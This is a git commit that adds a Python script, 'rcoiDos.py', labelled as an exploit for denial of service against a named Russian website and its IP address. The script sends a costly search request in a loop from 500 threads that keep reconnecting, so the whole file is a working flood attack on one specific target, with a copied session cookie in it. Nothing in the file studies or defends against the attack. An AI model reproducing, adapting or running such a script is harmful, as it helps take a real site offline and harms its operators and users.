8c2a5b764af618d2f7f9fe181f3d132f1e621272
DoctorEenot <47860375+DoctorEenot@users.noreply.github.com>
2019-06-25 21:10:13 +0300

    Add files via upload

---
+++ rcoiDos.py
@@ -0,0 +1,48 @@
+'''
+Exploit for DOS iac46.ru
+'''
+
+import socket
+import time
+import threading
+import requests
+payload = b'GET /index.php?searchword=1&ordering=newest&searchphrase=exact&areas[0]=content&areas[1]=weblinks&areas[2]=categories&areas[3]=sections&areas[4]=newsfeeds&option=com_search HTTP/1.1\r\nHost: iac46.ru\r\nUser-Agent: Say10\r\nAccept: text/html,application/xhtml+xml\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://iac46.ru/index.php?searchword=1&ordering=newest&searchphrase=exact&areas[0]=content&areas[1]=weblinks&areas[2]=categories&areas[3]=sections&areas[4]=newsfeeds&option=com_search\r\nConnection: keep-alive\r\nCookie: 8ab6136db8aab79bdf465e8e79151355=77jr3ljevk1god9sktkkp3kve1; sputnik_session=1560875606311|17\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'
+print('Heil to the Saitan')
+def dos():
+    global payload
+    while True:
+        try_ = True
+        while try_:
+            sock = socket.socket()
+            sock.settimeout(0.4)
+            try:
+                sock.connect(('31.131.251.38',80))
+                try_ = False
+            except:
+                sock.close()
+                try_ = True
+        while True:
+            try:
+                sock.send(payload)
+            except:
+                sock.close()
+                break
+
+
+e = []
+t = []
+n = 500
+for i in range(n+1):
+        e.append(threading.Event())
+for i in range(n):
+        t.append(threading.Thread(target = dos))
+
+for i in range(n):
+        t[i].start()
+for i in range(n):
+        try:
+            e[i].set()
+        except:
+            break
+for i in range(n):
+        t[i].join()
